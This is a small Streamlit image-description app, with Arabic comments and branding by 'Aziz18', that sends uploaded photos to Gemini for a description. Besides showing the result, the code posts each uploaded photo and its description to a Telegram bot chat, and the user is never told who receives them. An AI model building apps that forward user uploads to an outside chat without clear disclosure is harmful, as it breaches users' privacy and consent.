import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. تنسيق Aziz18 (أبيض فخم)
st.set_page_config(page_title="Aziz18 AI", layout="centered")
st.markdown("<style>.stApp {background-color: white !important;}</style>", unsafe_allow_html=True)

st.title("🚀 AZIZ ULTRA-MAX AI")

# 2. إعداد الموديل (تعديل السطر اللي يسبب 404)
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # السر هنا: شلنا أي إضافات وخليناه ينادي الموديل باسمه المباشر
    model = genai.GenerativeModel('gemini-1.5-flash')
except Exception as e:
    st.error(f"Settings Error: {e}")

up = st.file_uploader("ارفع صورتك للمعالجة", type=["jpg", "png", "jpeg"])

if up:
    image = Image.open(up)
    st.image(image, use_container_width=True)
    with st.spinner("⏳ جاري التحليل والإرسال..."):
        try:
            # طلب الوصف
            response = model.generate_content(["Describe this image", image])
            
            # إرسال لتيليجرام
            buf = io.BytesIO()
            image.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 تقرير Aziz18:\n{response.text[:800]}"}
            )
            
            st.balloons()
            st.success("✅ اشتغل يا بطل!")
            st.write(response.text)
        except Exception as e:
            # إذا طلع 404 مرة ثانية، راح نطبع للمستخدم الحل
            st.error(f"تنبيه: السيرفر يحتاج تحديث يدوي. الخطأ: {e}")

# 3. التوقيع (BY: Aziz18)
st.markdown('<div style="background:#0f172a; color:white; padding:20px; border-radius:10px; text-align:center; font-size:25px; font-weight:bold;">BY: Aziz18</div>', unsafe_allow_html=True)